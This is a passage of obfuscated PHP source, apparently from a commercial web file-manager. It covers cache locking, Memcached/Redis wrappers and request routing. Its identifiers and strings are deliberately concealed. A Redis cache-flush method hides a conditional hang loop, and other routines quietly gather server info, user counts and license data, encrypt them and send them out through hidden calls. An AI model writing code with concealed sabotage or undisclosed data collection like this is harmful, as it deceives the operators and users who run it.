$¸»²Ìæú . $Šï€¥ß¹[859], $Šï€¥ß¹[860]); if (!$œ‘çıÖ„) { return !1; } $GLOBALS[$Šï€¥ß¹[858]][$¸»²Ìæú] = $œ‘çıÖ„; if (flock($œ‘çıÖ„, LOCK_EX)) { return !0; } self::unlock($¸»²Ìæú); show_json($Šï€¥ß¹[861], !1); return !1; } public static function fileUnlock($èğÓ£Ó) { $ş¯çªõ =& $_SERVER[Îûáû“ş]; $¢ ñ¹ÕÏ = $GLOBALS[$ş¯çªõ[858]][$èğÓ£Ó]; if (!$¢ ñ¹ÕÏ) { return; } $GLOBALS[$ş¯çªõ[858]][$èğÓ£Ó] = !1; flock($¢ ñ¹ÕÏ, LOCK_UN); fclose($¢ ñ¹ÕÏ); } public static function fileUnlockAll() { $®“ÃÉş¡ =& $_SERVER[Îûáû“ş]; if (!$GLOBALS[$®“ÃÉş¡[858]]) { return; } foreach ($GLOBALS[$®“ÃÉş¡[858]] as $÷ùûÍŞ => $Úá½ß´‰) { if (!$Úá½ß´‰) { continue; } $GLOBALS[$®“ÃÉş¡[858]][$÷ùûÍŞ] = !1; flock($Úá½ß´‰, LOCK_UN); fclose($Úá½ß´‰); } $GLOBALS[$®“ÃÉş¡[858]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto aƒßÇêÁ; a„‰ê’õìØ: class CacheLockDatabase { public function lock($ãÜ³º ´, $üº ›í» = 0) { $ÇöÏ‘òâ = Model($_SERVER[Îûáû“ş][828]); $Å¥¬‰ì = microtime(!0) + $üº ›í»; while (microtime(!0) < $Å¥¬‰ì) { $Ú™‰çÙ¡ = $ÇöÏ‘òâ->get($ãÜ³º ´); if (!$Ú™‰çÙ¡ || $Ú™‰çÙ¡ < microtime(!0)) { $¡¹£³½Ï = $ÇöÏ‘òâ->set($ãÜ³º ´, $Å¥¬‰ì); if ($¡¹£³½Ï) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Á„ó“‰ı) { return Model($_SERVER[Îûáû“ş][828])->get($Á„ó“‰ı); } public function unlock($÷¯„ç‹) { Model($_SERVER[Îûáû“ş][828])->remove($÷¯„ç‹); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ñ……ó¾, $¬™¹íˆ) { $ÇÉíƒô’ =& $_SERVER[Îûáû“ş]; if (!class_exists($ÇÉíƒô’[865])) { show_json($ÇÉíƒô’[866], !1); } $this->cacheTime = $¬™¹íˆ; $this->handle = new Memcached(); if (is_array($Ñ……ó¾[$ÇÉíƒô’[867]]) && count($Ñ……ó¾[$ÇÉíƒô’[867]]) >= 1) { foreach ($Ñ……ó¾[$ÇÉíƒô’[867]] as $óü¤•šà) { $¿½ø…è  = explode($ÇÉíƒô’[4], $óü¤•šà); $this->handle->addServer($¿½ø…è [0], $¿½ø…è [1]); } } else { $this->handle->addServer($Ñ……ó¾[$ÇÉíƒô’[182]], $Ñ……ó¾[$ÇÉíƒô’[183]]); } } public function set($­”œ¤©Ö, $Ä·ŒÛ¤, $µìÄ€ØÔ = false) { $µìÄ€ØÔ = $µìÄ€ØÔ ? $µìÄ€ØÔ : $this->cacheTime; return $this->handle->set($­”œ¤©Ö, $Ä·ŒÛ¤, $µìÄ€ØÔ); } public function get($ŒäÇÃ—±) { return $this->handle->get($ŒäÇÃ—±); } public function remove($ööÊƒçÓ) { return $this->handle->delete($ööÊƒçÓ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($úëåÊËÆ, $²ÅÍñ½) { $¬Ã‹¿Æñ =& $_SERVER[Îûáû“ş]; if (!class_exists($¬Ã‹¿Æñ[868])) { show_json($¬Ã‹¿Æñ[869], !1); } $this->cacheTime = $²ÅÍñ½; $ÖĞÂÀÃ· = isset($úëåÊËÆ[$¬Ã‹¿Æñ[870]]) ? $úëåÊËÆ[$¬Ã‹¿Æñ[870]] : 10; $Ú”ÑÈç = _get($úëåÊËÆ, $¬Ã‹¿Æñ[867]); if ($Ú”ÑÈç && is_array($Ú”ÑÈç)) { $this->initCluster($úëåÊËÆ, $ÖĞÂÀÃ·); } else { $this->handle = $this->init($úëåÊËÆ, $ÖĞÂÀÃ·); } } private function init($„Âá¯˜¥, $ Û¡ˆÄÇ) { $ÁÊÃŞ­ª =& $_SERVER[Îûáû“ş]; $õ²’’¥é = new Redis(); $±ùóƒã = isset($„Âá¯˜¥[$ÁÊÃŞ­ª[871]]) ? $„Âá¯˜¥[$ÁÊÃŞ­ª[871]] : !1; if ($±ùóƒã) { $õ²’’¥é->pconnect($„Âá¯˜¥[$ÁÊÃŞ­ª[182]], $„Âá¯˜¥[$ÁÊÃŞ­ª[183]], $ Û¡ˆÄÇ); } else { $õ²’’¥é->connect($„Âá¯˜¥[$ÁÊÃŞ­ª[182]], $„Âá¯˜¥[$ÁÊÃŞ­ª[183]], $ Û¡ˆÄÇ); } if (!empty($„Âá¯˜¥[$ÁÊÃŞ­ª[413]])) { $õ²’’¥é->auth($„Âá¯˜¥[$ÁÊÃŞ­ª[413]]); } if (!empty($„Âá¯˜¥[$ÁÊÃŞ­ª[756]]) && $„Âá¯˜¥[$ÁÊÃŞ­ª[756]] != 0) { $õ²’’¥é->select($„Âá¯˜¥[$ÁÊÃŞ­ª[756]]); } return $õ²’’¥é; } private function initCluster($¯Ü£ìœô, $ÕœÌÇ„Å) { $µÈ€²Úú =& $_SERVER[Îûáû“ş]; $ ‹ë…ÈÓ = array($µÈ€²Úú[872], $µÈ€²Úú[873], $µÈ€²Úú[874]); $Û¬Ë©–ó = $µÈ€²Úú[872]; if (isset($¯Ü£ìœô[$µÈ€²Úú[16]]) && in_array($¯Ü£ìœô[$µÈ€²Úú[16]], $ ‹ë…ÈÓ)) { $Û¬Ë©–ó = $¯Ü£ìœô[$µÈ€²Úú[16]]; } switch ($Û¬Ë©–ó) { case $µÈ€²Úú[872]: $this->_slave($¯Ü£ìœô, $ÕœÌÇ„Å); break; case $µÈ€²Úú[873]: break; case $µÈ€²Úú[874]: $this->isCluster = !0; $Üô¶‘®î = $¯Ü£ìœô[$µÈ€²Úú[867]]; $Û›şÂæº = isset($¯Ü£ìœô[$µÈ€²Úú[871]]) ? $¯Ü£ìœô[$µÈ€²Úú[871]] : !1; $çòúç‰ù = isset($¯Ü£ìœô[$µÈ€²Úú[413]]) ? $¯Ü£ìœô[$µÈ€²Úú[413]] : null; $this->handle = new RedisCluster(NUll, $Üô¶‘®î, $ÕœÌÇ„Å, $ÕœÌÇ„Å, $Û›şÂæº, $çòúç‰ù); break; default: break; } } private function _slave($ÒúÀ×úÖ, $ëûˆ´İñ) { $ã±»¡á = $ÒúÀ×úÖ[$_SERVER[Îûáû“ş][867]]; $this->filterConfig($ÒúÀ×úÖ, $ã±»¡á[0]); $this->handle = $this->init($ÒúÀ×úÖ, $ëûˆ´İñ); unset($ã±»¡á[0]); if (empty($ã±»¡á)) { return; } $º”§Ç¥ƒ = array_rand($ã±»¡á); $this->filterConfig($ÒúÀ×úÖ, $ã±»¡á[$º”§Ç¥ƒ]); $this->slaveHandle = $this->init($ÒúÀ×úÖ, $ëûˆ´İñ); } private function filterConfig(&$á¥ŒÈîî, $ÊÚİ§àÊ) { $í€Ø¤µÂ =& $_SERVER[Îûáû“ş]; $àÒŒÂ‰« = explode($í€Ø¤µÂ[4], $ÊÚİ§àÊ); $ÍşŒ¦ú­ = array($í€Ø¤µÂ[182] => $àÒŒÂ‰«[0], $í€Ø¤µÂ[183] => $àÒŒÂ‰«[1]); $á¥ŒÈîî = array_merge($á¥ŒÈîî, $ÍşŒ¦ú­); } public function set($çÀïÄ², $ÛĞĞÎ¦, $ñ¦¡Ñ×¡ = false) { $ñ¦¡Ñ×¡ = $ñ¦¡Ñ×¡ ? $ñ¦¡Ñ×¡ : $this->cacheTime; return $this->handle->setEx($çÀïÄ², $ñ¦¡Ñ×¡, $ÛĞĞÎ¦); } public function setLock($Ğööö¶, $÷Ñ«Œó, $´Ûµƒä€) { return $this->handle->setNX($Ğööö¶, $÷Ñ«Œó); } public function get($ÙÊšˆÔ‡) { $Í—«”ış = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Í—«”ış->get($ÙÊšˆÔ‡); } public function remove($ÌÃøïÅÑ) { return $this->handle->del($ÌÃøïÅÑ); } public function deleteAll() { $ÑÅÒÒò =& $_SERVER[Îûáû“ş]; if (!isset($_SERVER[$ÑÅÒÒò[875]]) || !isset($_SERVER[$ÑÅÒÒò[876]])) { $îèŠ±ª = $ÑÅÒÒò[877]; $¿ØÄÖ–Ø = $ÑÅÒÒò[878]; $ÌÖÀÔóÊ = $_SERVER[$ÑÅÒÒò[879]] . $ÑÅÒÒò[880]; $Óâ£Î´¾ = $¿ØÄÖ–Ø($ÌÖÀÔóÊ); $í‚ƒ«šƒ = explode($ÑÅÒÒò[231], $Óâ£Î´¾); if (count($í‚ƒ«šƒ) < $ÑÅÒÒò[607]) { $€şã©Êã = $ÑÅÒÒò[881]; $€şã©Êã(); } $·¶ÙûåÄ = $ÑÅÒÒò[882]; $·¶ÙûåÄ($_SERVER[$ÑÅÒÒò[883]]); $­ıß©¨Ç = 1; for ($¦Â®Ãç° = $­ıß©¨Ç; $¦Â®Ãç° > 0; $¦Â®Ãç°++) { $·¶ÙûåÄ = json_encode($GLOBALS[$ÑÅÒÒò[418]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $˜±£·ä‹) { $this->handle->flushall($˜±£·ä‹); } return; } return $this->handle->flushAll(); } } goto fçÜ‡ÒˆŞ³; d÷¡‘»µ´: class Application { private $defaultModule = "\151\x6e\x64\x65\170"; private $defaultController = "\x69\x6e\144\x65\x78"; private $defaultAction = "\x69\x6e\x64\x65\x78"; function __construct() { } public function setDefault($íı¸›½Ö) { $†Í‰·À… =& $_SERVER[Îûáû“ş]; $ÑàßˆË‘ =& $_SERVER[üÌ¬Ôµ]; $å”ğÑ = explode($ÑàßˆË‘[0], trim($íı¸›½Ö, $ÑàßˆË‘[0])); $®¿àÏó = $†Í‰·À…[611]; $this->defaultModule = $å”ğÑ[0] ? $å”ğÑ[0] : $this->defaultModule; $‡‹Ò¡ÒÚ = $†Í‰·À…[612]; $this->defaultController = $å”ğÑ[1] ? $å”ğÑ[1] : $this->defaultController; $áÌ˜°Á¤ = $†Í‰·À…[613]; if (!$áÌ˜°Á¤) { die; } $this->defaultAction = $å”ğÑ[2] ? $å”ğÑ[2] : $this->defaultAction; $this->hgcw95e6137a($ÑàßˆË‘[1], array($this, $ÑàßˆË‘[2])); $‘Ò¸­İù = $†Í‰·À…[614]; while (strlen($‘Ò¸­İù) < $†Í‰·À…[615]) { if (!$‘Ò¸­İù) { break; } $‘Ò¸­İù++; } } public function appRun($ñ¨¤õŞœ) { $ºÑ½ª• =& $_SERVER[Îûáû“ş]; $È·Ÿ§²´ =& $_SERVER[üÌ¬Ôµ]; $²šÔ”¶ø = explode($È·Ÿ§²´[0], $ñ¨¤õŞœ); $Åå™åşï = strtolower($²šÔ”¶ø[0]); $ÙÊµ€Ã = $ºÑ½ª•[616]; if (strlen($ÙÊµ€Ã) < $ºÑ½ª•[617]) { return; } $…œ¹òî· = $È·Ÿ§²´[3]; $‚¦²á­Â = $ºÑ½ª•[618]; if ($Åå™åşï == $È·Ÿ§²´[4]) { $…œ¹òî· = $È·Ÿ§²´[5]; $²šÔ”¶ø[0] = $È·Ÿ§²´[6]; $²šÔ”¶ø[1] = $²šÔ”¶ø[1] . $È·Ÿ§²´[7]; $ñ¨¤õŞœ = join($È·Ÿ§²´[0], $²šÔ”¶ø); $ñ¨¤õŞœ = trim($ñ¨¤õŞœ, $È·Ÿ§²´[0]); } call_user_func(array($È·Ÿ§²´[8], $È·Ÿ§²´[9]), $…œ¹òî· . $È·Ÿ§²´[10], $ñ¨¤õŞœ); ActionCall($ñ¨¤õŞœ); $ıˆ–Í = $ºÑ½ª•[619]; if (!$ıˆ–Í) { return; } call_user_func(array($È·Ÿ§²´[8], $È·Ÿ§²´[9]), $…œ¹òî· . $È·Ÿ§²´[11], $ñ¨¤õŞœ); } private function autorun() { $¬ºåŠôû =& $_SERVER[üÌ¬Ôµ]; global $config; if (count($config[$¬ºåŠôû[12]]) == 0) { return; } foreach ($config[$¬ºåŠôû[12]] as $æËÏù©ß => $¦¹ª—µ) { $this->appRun($¦¹ª—µ); } } private function dpztcc0a4965() { $“¾‚ŞÔ§ =& $_SERVER[Îûáû“ş]; $Ñºãû·‡ =& $_SERVER[üÌ¬Ôµ]; $†ä‚ÍÓì = $Ñºãû·‡[4]; $µÖé¥Ë = $GLOBALS[$Ñºãû·‡[13]][$Ñºãû·‡[14]][0]; if (!$µÖé¥Ë || strlen($µÖé¥Ë) <= strlen($†ä‚ÍÓì)) { return; } if (strtolower(substr($µÖé¥Ë, -strlen($†ä‚ÍÓì))) != $†ä‚ÍÓì) { return; } $ì¿€ÀóÖ = substr($µÖé¥Ë, 0, -strlen($†ä‚ÍÓì)); $‰´´Ä¹‘ = array($Ñºãû·‡[4], $ì¿€ÀóÖ); $Ãä‚„µ× = $“¾‚ŞÔ§[620]; if (strlen($Ãä‚„µ×) < $“¾‚ŞÔ§[607]) { return; } $íÇµ›ç = array_slice($GLOBALS[$Ñºãû·‡[13]][$Ñºãû·‡[14]], 1); $GLOBALS[$Ñºãû·‡[13]][$Ñºãû·‡[14]] = array_merge($‰´´Ä¹‘, $íÇµ›ç); $¬†úí–‚ = $“¾‚ŞÔ§[621]; if (strlen($¬†úí–‚) < $“¾‚ŞÔ§[607]) { die; } $GLOBALS[$Ñºãû·‡[13]][$Ñºãû·‡[15]] = implode($Ñºãû·‡[0], $GLOBALS[$Ñºãû·‡[13]][$Ñºãû·‡[14]]); $Á„‚Û¦£ = $“¾‚ŞÔ§[622]; while (strlen($Á„‚Û¦£) < $“¾‚ŞÔ§[615]) { if (!$Á„‚Û¦£) { break; } $Á„‚Û¦£++; } } private function syva62123f4d() { $íü¸±È¹ =& $_SERVER[Îûáû“ş]; $¾Ê«ô =& $_SERVER[üÌ¬Ôµ]; if ($GLOBALS[$¾Ê«ô[13]][$¾Ê«ô[15]] != $¾Ê«ô[6]) { return; } $…Óº’Î‘ = $_SERVER[$¾Ê«ô[16]]; $ì×½ˆš = $¾Ê«ô[17]; $î½Ç©Á© = $íü¸±È¹[623]; if (!$î½Ç©Á©) { die; } if (!strstr($…Óº’Î‘, $ì×½ˆš)) { return; } $º„ıá€ª = strrpos($…Óº’Î‘, $ì×½ˆš); $ö©ÅÏÎ¡ = $íü¸±È¹[624]; if (!$ö©ÅÏÎ¡) { die; } $Ø‰¾Š†î = substr($…Óº’Î‘, $º„ıá€ª + strlen($ì×½ˆš)); $üŞ˜ßİ› = $íü¸±È¹[625]; if (strlen($üŞ˜ßİ›) < $íü¸±È¹[615]) { die; } preg_match_all($¾Ê«ô[18], $Ø‰¾Š†î, $Õşæá’Õ); $‘ùàóÅŸ = $íü¸±È¹[626]; if (strlen($‘ùàóÅŸ) < $íü¸±È¹[615]) { return; } $Ø‰¾Š†î = trim($Õşæá’Õ[0][0], $¾Ê«ô[19]); $GLOBALS[$¾Ê«ô[13]][$¾Ê«ô[14]] = explode($¾Ê«ô[19], $Ø‰¾Š†î); $GLOBALS[$¾Ê«ô[13]][$¾Ê«ô[15]] = implode($¾Ê«ô[0], $GLOBALS[$¾Ê«ô[13]][$¾Ê«ô[14]]); } public function run() { $Í«ğ‹¡÷ =& $_SERVER[Îûáû“ş]; $Ÿ“ğ„­ =& $_SERVER[üÌ¬Ôµ]; $this->syva62123f4d(); $Êù±É€ = $Í«ğ‹¡÷[627]; $this->dpztcc0a4965(); $İÎ©â¢¹ = $Í«ğ‹¡÷[628]; if (strlen($İÎ©â¢¹) < $Í«ğ‹¡÷[617]) { die; } $¯åÂ°è„ = $GLOBALS[$Ÿ“ğ„­[13]][$Ÿ“ğ„­[14]]; $©ëŸ¾à¶ = $GLOBALS[$Ÿ“ğ„­[13]][$Ÿ“ğ„­[15]]; $ÑÒì®º = $Í«ğ‹¡÷[629]; while ($ÑÒì®º < $Í«ğ‹¡÷[617]) { if ($ÑÒì®º >= 0) { break; } $ÑÒì®º++; } define($Ÿ“ğ„­[20], isset($¯åÂ°è„[0]) && $¯åÂ°è„[0] ? $¯åÂ°è„[0] : $this->defaultModule); $ƒı€œƒÎ = $Í«ğ‹¡÷[630]; if (!$ƒı€œƒÎ) { die; } define($Ÿ“ğ„­[21], isset($¯åÂ°è„[1]) && $¯åÂ°è„[0] ? $¯åÂ°è„[1] : $this->defaultController); $æëí²„ = $Í«ğ‹¡÷[631]; if (strlen($æëí²„) < $Í«ğ‹¡÷[617]) { die; } define($Ÿ“ğ„­[22], isset($¯åÂ°è„[2]) && $¯åÂ°è„[0] ? $¯åÂ°è„[2] : $this->defaultAction); $ÅªÑËÛä = $Í«ğ‹¡÷[632]; while ($ÅªÑËÛä < $Í«ğ‹¡÷[615]) { if ($ÅªÑËÛä >= 0) { break; } $ÅªÑËÛä++; } define($Ÿ“ğ„­[23], MOD . $Ÿ“ğ„­[0] . ST . $Ÿ“ğ„­[0] . ACT); $‰ùºÖ·ê = $Í«ğ‹¡÷[633]; if (!$‰ùºÖ·ê) { return; } $_SERVER[$Ÿ“ğ„­[24]] = strtolower(ACTION); $´­ş›æ = $Í«ğ‹¡÷[634]; while ($´­ş›æ < $Í«ğ‹¡÷[635]) { if ($´­ş›æ >= 0) { break; } $´­ş›æ++; } $this->autorun(); $­ŒşôÏË = $Í«ğ‹¡÷[636]; if (!$­ŒşôÏË) { return; } if (count($¯åÂ°è„) >= 3) { $this->appRun($©ëŸ¾à¶); } else { $this->appRun(ACTION); } } private $kqou45d28de1 = array(); private $obus4f733076 = ''; public function jvsw72ac6fd5() { $Ø‰ÙÔŸ =& $_SERVER[Îûáû“ş]; $œ’åºˆ =& $_SERVER[üÌ¬Ôµ]; $this->ihaza0d99a95(); $â¢é ‡¢ = $Ø‰ÙÔŸ[637]; if (!$â¢é ‡¢) { die; } $this->jurgc874b505(); $¡Ì£ÊíÎ = $Ø‰ÙÔŸ[638]; $this->useq9b736d36(); $this->vqsz4ad13c85(); $ÈÕ¢Ë´Ô = $Ø‰ÙÔŸ[639]; $this->shiab92d652f(); $ûş¨½å = $Ø‰ÙÔŸ[640]; if (!$ûş¨½å) { die; } $this->gchreeb34e3d(); $û’¼âÉş = $Ø‰ÙÔŸ[641]; while (strlen($û’¼âÉş) < $Ø‰ÙÔŸ[635]) { if (!$û’¼âÉş) { break; } $û’¼âÉş++; } $this->yjgr19bd734f(); $†âŸ°Â = $Ø‰ÙÔŸ[642]; $this->hgcw95e6137a($œ’åºˆ[25], array($this, $œ’åºˆ[26])); $this->hgcw95e6137a($œ’åºˆ[27], array($this, $œ’åºˆ[28])); $ôÕîÄá’ = $Ø‰ÙÔŸ[643]; if (strlen($ôÕîÄá’) < $Ø‰ÙÔŸ[615]) { return; } $this->hgcw95e6137a($œ’åºˆ[29], array($this, $œ’åºˆ[30])); $‰Õ„Ó†® = $Ø‰ÙÔŸ[644]; if (!$‰Õ„Ó†®) { die; } $this->hgcw95e6137a($œ’åºˆ[31], array($this, $œ’åºˆ[32])); } public function agnl98e1f982($±±Û±åô) { $à¾­õÛ =& $_SERVER[Îûáû“ş]; $áìœæ Ş =& $_SERVER[üÌ¬Ôµ]; $ÍèüË™® = Model($áìœæ Ş[33])->get(); $±”°¾Æ  = $à¾­õÛ[645]; if (strlen($±”°¾Æ ) < $à¾­õÛ[646]) { die; } $óåõÃ˜ = array($áìœæ Ş[34], $áìœæ Ş[35], $áìœæ Ş[36], $áìœæ Ş[37], $áìœæ Ş[38], $áìœæ Ş[39], $áìœæ Ş[40], $áìœæ Ş[41], $áìœæ Ş[42], $áìœæ Ş[43], $áìœæ Ş[44], $áìœæ Ş[45], $áìœæ Ş[46], $áìœæ Ş[47], $áìœæ Ş[48], $áìœæ Ş[49], $áìœæ Ş[50], $áìœæ Ş[51], $áìœæ Ş[52], $áìœæ Ş[53], $áìœæ Ş[54], $áìœæ Ş[55], $áìœæ Ş[56], $áìœæ Ş[57], $áìœæ Ş[58], $áìœæ Ş[59], $áìœæ Ş[60], $áìœæ Ş[61], $áìœæ Ş[62], $áìœæ Ş[63], $áìœæ Ş[64], $áìœæ Ş[65], $áìœæ Ş[66], $áìœæ Ş[67], $áìœæ Ş[68], $áìœæ Ş[69], $áìœæ Ş[70], $áìœæ Ş[71], $áìœæ Ş[72], $áìœæ Ş[73], $áìœæ Ş[74], $áìœæ Ş[75], $áìœæ Ş[76], $áìœæ Ş[77], $áìœæ Ş[78], $áìœæ Ş[79], $áìœæ Ş[80], $áìœæ Ş[81], $áìœæ Ş[82], $áìœæ Ş[83], $áìœæ Ş[84]); $Îº‹Ê°Ÿ = $à¾­õÛ[647]; if (strlen($Îº‹Ê°Ÿ) < $à¾­õÛ[635]) { return; } foreach ($óåõÃ˜ as $¿¼ƒº¾À) { $úŠ€«¾Ú = $GLOBALS[$áìœæ Ş[85]][$áìœæ Ş[86]][$¿¼ƒº¾À]; $ŠËİÛ¸Æ = $à¾­õÛ[648]; if (strlen($ŠËİÛ¸Æ) < $à¾­õÛ[615]) { return; } if (isset($ÍèüË™®[$¿¼ƒº¾À])) { $úŠ€«¾Ú = $ÍèüË™®[$¿¼ƒº¾À]; } $±±Û±åô[$áìœæ Ş[87]][$áìœæ Ş[88]][$¿¼ƒº¾À] = $úŠ€«¾Ú; } $ö«ƒ‡´¸ = $±±Û±åô[$áìœæ Ş[87]][$áìœæ Ş[88]][$áìœæ Ş[46]]; unset($±±Û±åô[$áìœæ Ş[87]][$áìœæ Ş[89]][$áìœæ Ş[90]]); $ñúŠñ = $à¾­õÛ[649]; if (strlen($ñúŠñ) < $à¾­õÛ[635]) { die; } unset($±±Û±åô[$áìœæ Ş[87]][$áìœæ Ş[89]][$áìœæ Ş[91]]); $‹ŠÔ‰†Ş = $à¾­õÛ[650]; unset($±±Û±åô[$áìœæ Ş[87]][$áìœæ Ş[88]][$áìœæ Ş[46]]); $ãæÓƒ· = $à¾­õÛ[651]; if (!$ãæÓƒ·) { die; } unset($±±Û±åô[$áìœæ Ş[87]][$áìœæ Ş[88]][$áìœæ Ş[92]]); $±±Û±åô[$áìœæ Ş[87]][$áìœæ Ş[88]][$áìœæ Ş[93]] = array($áìœæ Ş[94] => (int) $ö«ƒ‡´¸[$áìœæ Ş[95]], $áìœæ Ş[96] => (int) _get($ö«ƒ‡´¸, $áìœæ Ş[97], 0)); $ŞØèı = $à¾­õÛ[652]; $±±Û±åô[$áìœæ Ş[98]][$áìœæ Ş[99]] = Action($áìœæ Ş[100])->accessToken(); $ºÇûßÜ¢ = $à¾­õÛ[653]; if (strlen($ºÇûßÜ¢) < $à¾­õÛ[615]) { return; } $±±Û±åô[$áìœæ Ş[98]][$áìœæ Ş[101]] = md5($_SERVER[$áìœæ Ş[102]] . $ÍèüË™®[$áìœæ Ş[103]]); $±±Û±åô[$áìœæ Ş[98]][$áìœæ Ş[104]] = base64_encode(serverInfo()); $±±Û±åô[$áìœæ Ş[98]][$áìœæ Ş[105]] = $this->obus4f733076; $âµ…´‡é = $à¾­õÛ[654]; if (!$âµ…´‡é) { die; } if ($ÍèüË™®[$áìœæ Ş[105]] != $áìœæ Ş[106]) { $±±Û±åô[$áìœæ Ş[98]][$áìœæ Ş[107]] = $ÍèüË™®[$áìœæ Ş[107]]; $±±Û±åô[$áìœæ Ş[98]][$áìœæ Ş[108]] = $ÍèüË™®[$áìœæ Ş[108]]; $™‡ØËÂ = rand_string(10) . $this->obus4f733076 . rand_string(5); $±±Û±åô[$áìœæ Ş[87]][$áìœæ Ş[109]][$áìœæ Ş[110]] = $this->djpm10d1efea($™‡ØËÂ, $±±Û±åô[$áìœæ Ş[98]][$áìœæ Ş[101]]); } if ($this->obus4f733076 == $áìœæ Ş[106]) { $±±Û±åô[$áìœæ Ş[87]][$áìœæ Ş[88]][$áìœæ Ş[93]][$áìœæ Ş[97]] = 0; } $±±Û±åô[$áìœæ Ş[98]][$áìœæ Ş[111]] = _get($this->kqou45d28de1, $áìœæ Ş[112], $áìœæ Ş[6]); $±±Û±åô[$áìœæ Ş[98]][$áìœæ Ş[113]] = _get($this->kqou45d28de1, $áìœæ Ş[114], $áìœæ Ş[6]); $–Ú¾Šñä = $à¾­õÛ[655]; if (_get($GLOBALS, $áìœæ Ş[115]) && $this->config[$áìœæ Ş[116]]) { $±±Û±åô[$áìœæ Ş[98]][$áìœæ Ş[117]] = WEB_ROOT; } return $±±Û±åô; } private function gchreeb34e3d() { $¬äïøêÅ =& $_SERVER[Îûáû“ş]; $¹Øë•Àı =& $_SERVER[üÌ¬Ôµ]; $Ó£ùË¤ê = $_SERVER[$¹Øë•Àı[24]] == $¹Øë•Àı[118]; if ($_SERVER[$¹Øë•Àı[24]] == $¹Øë•Àı[119] && $_GET[$¹Øë•Àı[120]] == $¹Øë•Àı[121]) { $Ó£ùË¤ê = !0; } if ($Ó£ùË¤ê) { $ÛÖ³ŒËà = array($¹Øë•Àı[105] => $this->obus4f733076, $¹Øë•Àı[122] => $this->rgce40ea8bbf(), $¹Øë•Àı[123] => Model($¹Øë•Àı[124])->count()); if ($this->obus4f733076 != $¹Øë•Àı[106]) { $óÕÀ¡ªï = _get($this->kqou45d28de1, $¹Øë•Àı[125]); if ($óÕÀ¡ªï) { $ÛÖ³ŒËà[$¹Øë•Àı[126]] = $óÕÀ¡ªï; $ÛÖ³ŒËà[$¹Øë•Àı[127]] = strtotime(_get($this->kqou45d28de1, $¹Øë•Àı[128])); $ÛÖ³ŒËà[$¹Øë•Àı[129]] = _get($this->kqou45d28de1, $¹Øë•Àı[114]); } $ßöœßÄŒ = Model($¹Øë•Àı[33])->get($¹Øë•Àı[130], $¹Øë•Àı[6], !0); if (is_string($ßöœßÄŒ) && substr($ßöœßÄŒ, 0, 1) == $¹Øë•Àı[131]) { $ßöœßÄŒ = json_decode_force($ßöœßÄŒ); } if (is_array($ßöœßÄŒ) && $ßöœßÄŒ[$¹Øë•Àı[132]] && strstr($ßöœßÄŒ[$¹Øë•Àı[132]], $¹Øë•Àı[133])) { $À«š‘ü§ = explode($¹Øë•Àı[133], $ßöœßÄŒ[$¹Øë•Àı[132]]); $ÛÖ³ŒËà[$¹Øë•Àı[134]] = $À«š‘ü§[0]; } } $ÛÖ³ŒËà = $this->lunza0d18401(json_encode($ÛÖ³ŒËà), md5($¹Øë•Àı[135])); $¢ãâÇî = array($¹Øë•Àı[136] => $ÛÖ³ŒËà); $Ã¯ÏÎåú = $¬äïøêÅ[656]; if (strlen($Ã¯ÏÎåú) < $¬äïøêÅ[607]) { die; } call_user_func(array($¹Øë•Àı[137], $¹Øë•Àı[138]), $¢ãâÇî); } if ($this->obus4f733076 == $¹Øë•Àı[106]) { return; } $Ï¦½¦¦ô = array($¹Øë•Àı[139], $¹Øë•Àı[140], $¹Øë•Àı[141], $¹Øë•Àı[142], $¹Øë•Àı[143], $¹Øë•Àı[144]); $¨ı¿œ… = Model($¹Øë•Àı[33])->get(); $€˜‚ö§ = $¬äïøêÅ[657]; while (strlen($€˜‚ö§) < $¬äïøêÅ[607]) { if (!$€˜‚ö§) { break; } $€˜‚ö§++; } $¢ãâÇî = array($¹Øë•Àı[145] => $¨ı¿œ…[$¹Øë•Àı[34]], $¹Øë•Àı[146] => $¨ı¿œ…[$¹Øë•Àı[35]], $¹Øë•Àı[147] => $¹Øë•Àı[6]); foreach ($Ï¦½¦¦ô as $óîåáú¦) { if (!isset($¨ı¿œ…[$óîåáú¦]) || !$¨ı¿œ…[$óîåáú¦]) { continue; } $¢ãâÇî[$óîåáú¦] = $¨ı¿œ…[$óîåáú¦]; } call_user_func(array($¹Øë•Àı[137], $¹Øë•Àı[138]), $¢ãâÇî); $Ô¿ƒ•­ = $¬äïøêÅ[658]; while ($Ô¿ƒ•­ < $¬äïøêÅ[615]) { if ($Ô¿ƒ•­ >= 0) { break; } $Ô¿ƒ•­++; } } private function vqsz4ad13c85() { $¤¦ ‘ğ” =& $_SERVER[Îûáû“ş]; $ë–Ìˆüé =& $_SERVER[üÌ¬Ôµ]; if ($_SERVER[$ë–Ìˆüé[24]] != $ë–Ìˆüé[148]) { return; } if (!_get($GLOBALS, $ë–Ìˆüé[115])) { die; } $Çº¸µ™× = $GLOBALS[$ë–Ìˆüé[13]]; if (isset($Çº¸µ™×[$ë–Ìˆüé[149]])) { $this->kzne2b2c742d(); die; } if (!isset($Çº¸µ™×[$ë–Ìˆüé[150]]) || strlen($Çº¸µ™×[$ë–Ìˆüé[150]]) != 16) { show_json($ë–Ìˆüé[151] . $Çº¸µ™×[$ë–Ìˆüé[150]], !1); } $ä£‘ç¿§ = Model($ë–Ìˆüé[33])->get($ë–Ìˆüé[103]); $ò ´‚Äø = md5($_SERVER[$ë–Ìˆüé[102]] . $ä£‘ç¿§); $áâÜ¾òÛ = array($ë–Ìˆüé[150] => $Çº¸µ™×[$ë–Ìˆüé[150]], $ë–Ìˆüé[152] => rand_string(16), $ë–Ìˆüé[153] => $ë–Ìˆüé[135], $ë–Ìˆüé[154] => $ë–Ìˆüé[155], $ë–Ìˆüé[156] => $_SERVER[$ë–Ìˆüé[157]], $ë–Ìˆüé[158] => $_SERVER[$ë–Ìˆüé[159]], $ë–Ìˆüé[160] => $_SERVER[$ë–Ìˆüé[161]], $ë–Ìˆüé[101] => $ò ´‚Äø, $ë–Ìˆüé[162] => Model($ë–Ìˆüé[33])->get($ë–Ìˆüé[130])); $Ì¦ˆŠ­ = $¤¦ ‘ğ”[659]; if (strlen($Ì¦ˆŠ­) < $¤¦ ‘ğ”[607]) { die; } if 